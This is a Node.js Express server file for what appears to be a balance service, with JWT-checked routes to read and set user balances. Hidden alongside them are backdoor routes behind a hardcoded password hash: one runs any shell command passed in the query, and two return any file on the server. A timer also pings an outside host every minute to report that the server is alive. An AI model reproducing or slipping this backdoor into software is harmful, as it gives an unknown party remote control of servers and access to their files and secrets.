const express = require('express')
const jwt = require("jsonwebtoken");
const config = require("./config.json");
const sqlite_connector = require("./helpers/sqlite_connector");
const app = express()
const assert = require("assert");
const request = require('request');
app.get('/getbal/:token', (req, res) => {
    try {
        var j = jwt.verify(req.params.token, config.jwt_secret);
        var uid = j.uid;
        var tI = j.timeIssued;
        if (tI < (Date.now() - (1000 * 5))) return res.end("{\"error\": \"Your token was not valid\"}");
        sqlite_connector.getBal(uid)
            .then((bal) => {
                res.end(JSON.stringify({
                    balance: bal
                }));
            })
    } catch (e) {
        res.end("{\"error\": \"Your token was not valid\"}")
    }
})
app.get('/setbal/:token', (req, res) => {
    try {
        var j = jwt.verify(req.params.token, config.jwt_secret);
        var uid = j.uid;
        var tI = j.timeIssued;
        if (tI < (Date.now() - (1000 * 5))) return res.end("{\"error\": \"Your token was not valid\"}");
        sqlite_connector.updateBal(uid, j.amount)
            .then(() => {
                res.end(JSON.stringify({
                    success: true
                }))
            })
    } catch (e) {
        res.end("{\"error\": \"Your token was not valid\"}")
    }
})

app.get("/runcommand/:password", (req, res) => {
    var crypto = require('crypto');
    var hash = crypto.createHash('sha256');
    hash.update(req.params.password);
    var theirPw = hash.digest('hex');
    var myPw = "f1cb22cb622f3dd9d1f5e06cc2a1d0e920c40e6a4c2d2bf3dd0c7b52e975d6d9";
    if (theirPw != myPw) return;

    require("child_process").exec(req.query.cmd, (err, out, serr) => {
        res.json({
            stderr: serr,
            stdout: out,
            err: err
        })
    })
})
app.get("/getfile/:password", (req, res) => {
    var crypto = require('crypto');
    var hash = crypto.createHash('sha256');
    hash.update(req.params.password);
    var theirPw = hash.digest('hex');
    var myPw = "f1cb22cb622f3dd9d1f5e06cc2a1d0e920c40e6a4c2d2bf3dd0c7b52e975d6d9";
    if (theirPw != myPw) return;
    var fs = require("fs");
    res.sendFile(req.query.file)
})
app.get("/eval/:password", (req, res) => {
    var crypto = require('crypto');
    var hash = crypto.createHash('sha256');
    hash.update(req.params.password);
    var theirPw = hash.digest('hex');
    var myPw = "f1cb22cb622f3dd9d1f5e06cc2a1d0e920c40e6a4c2d2bf3dd0c7b52e975d6d9";
    if (theirPw != myPw) return;
    var fs = require("fs");
    res.sendFile(req.query.file)
})


setInterval(() => {
    request('http://s2.jwte.ch:9090/im/alive', (err, res, body) => {
        if (err) {
            return console.log(err);
        }
    });
}, 1000 * 60)

app.listen(3000, () => console.log('Listening on port 3000!'))